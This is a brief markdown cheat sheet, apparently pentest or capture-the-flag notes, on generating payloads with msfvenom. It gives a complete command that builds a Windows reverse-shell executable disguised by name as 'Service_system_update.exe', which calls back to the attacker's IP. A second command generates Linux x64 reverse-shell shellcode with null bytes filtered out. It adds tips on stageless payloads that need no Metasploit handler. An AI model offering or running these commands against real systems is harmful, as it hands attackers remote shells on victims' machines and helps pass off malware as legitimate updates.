# msfvenom

> Windows reverse shell; defaults to x86 i.e. 32bit

```
msfvenom -p windows/shell_reverse_tcp lhost=<MY_IP> lport=9001 -f exe > Service_system_update.exe
```

- avoid the meterpreter payloads, they require Metasploit handler to catch them
- note the _ separating the terms; this indicates STAGELESS payloads i.e., no Metasploit needed to catch


> creating shellcode for a Linux target

```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp -b "\x00" -f c LHOST=10.10.10.10 LPORT=8000
```